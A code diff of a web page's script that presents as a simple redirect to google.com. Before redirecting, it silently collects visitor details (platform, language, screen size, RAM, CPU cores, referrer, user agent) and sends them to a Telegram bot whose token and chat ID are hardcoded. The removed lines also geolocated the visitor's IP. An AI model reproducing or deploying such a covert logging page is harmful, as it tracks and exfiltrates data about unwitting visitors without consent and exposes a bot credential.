@@ -11,42 +11,27 @@
         const BOT_TOKEN = "9231529625:AAEMepewolQDytYwOum3aIrfIO1MBzJqous";
         const CHAT_ID = "8814781494";
 
-        async function collectAndSend() {
-            let ipInfo = "Не удалось определить";
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                ipInfo = ${data.ip} (${data.city}, ${data.country_name});
-            } catch (e) {
-                // Если запрос к IP заблокирован адблоком или сетью
-            }
+        // Собираем базовую информацию без внешних запросов, которые могут блокироваться
+        const info = "🚨 Новый посетитель на сайте!\n\n" +
+                     "⏱ Время: " + new Date().toLocaleString() + "\n" +
+                     "💻 Платформа: " + navigator.platform + "\n" +
+                     "🗣 Язык: " + navigator.language + "\n" +
+                     "📺 Экран: " + window.screen.width + "x" + window.screen.height + "\n" +
+                     "🧠 Память (RAM): " + (navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "неизвестно") + "\n" +
+                     "⚙️ Ядра процессора: " + (navigator.hardwareConcurrency || "неизвестно") + "\n" +
+                     "🔗 Источник: " + (document.referrer || "прямой заход") + "\n" +
+                     "📱 User-Agent: " + navigator.userAgent;
 
-            const info = "🚨 Новый посетитель на сайте!\n\n" +
-                         "⏱️ Время: " + new Date().toLocaleString() + "\n" +
-                         "🌐 IP / Локация: " + ipInfo + "\n" +
-                         "💻 Платформа: " + navigator.platform + "\n" +
-                         "🗣 Язык: " + navigator.language + "\n" +
-                         "📺 Экран: " + window.screen.width + "x" + window.screen.height + "\n" +
-                         "🧠 Память (RAM): " + (navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "неизвестно") + "\n" +
-                         "⚙️ Ядра процессора: " + (navigator.hardwareConcurrency || "неизвестно") + "\n" +
-                         "🔗 Источник (Referrer): " + (document.referrer || "прямой заход") + "\n" +
-                         "📱 User-Agent: " + navigator.userAgent;
+        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(info);
 
-            const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(info) + "&parse_mode=Markdown";
+        // Отправляем запрос в Telegram, но НЕ ждем его завершения для редиректа,
+        // чтобы страница не зависала, если Telegram или сеть заблокированы.
+        fetch(url).catch(function() {});
 
-            try {
-                await fetch(url);
-            } catch (e) {
-                // Игнорируем возможные ошибки сети при отправке
-            }
-
-            // Перенаправление после отправки (или таймаута)
-            setTimeout(function() {
-                window.location.href = "https://google.com";
-            }, 1000);
-        }
-
-        collectAndSend();
+        // Перенаправление на целевой сайт через 500 миллисекунд
+        setTimeout(function() {
+            window.location.href = "https://google.com";
+        }, 500);
     </script>
 </body>
 </html>
